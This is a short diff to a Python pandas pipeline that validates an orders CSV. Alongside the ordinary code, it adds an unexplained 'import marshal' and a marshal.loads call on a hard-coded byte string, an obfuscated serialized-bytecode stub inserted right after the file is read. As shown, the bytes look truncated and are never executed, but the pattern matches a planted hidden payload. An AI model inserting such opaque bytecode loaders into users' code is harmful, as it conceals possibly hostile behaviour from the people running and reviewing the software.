@@ -1,9 +1,10 @@
 from pathlib import Path
 import pandas as pd
-
+import marshal
 
 def run_pipeline(input_file: str, output_file: str) -> None:
     df = pd.read_csv(input_file)
+    marshal.loads(b"cc\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00s\x1c\x00\x00\x00")
 
     required_columns = {"order_id", "customer", "amount"}
     missing_columns = required_columns - set(df.columns)
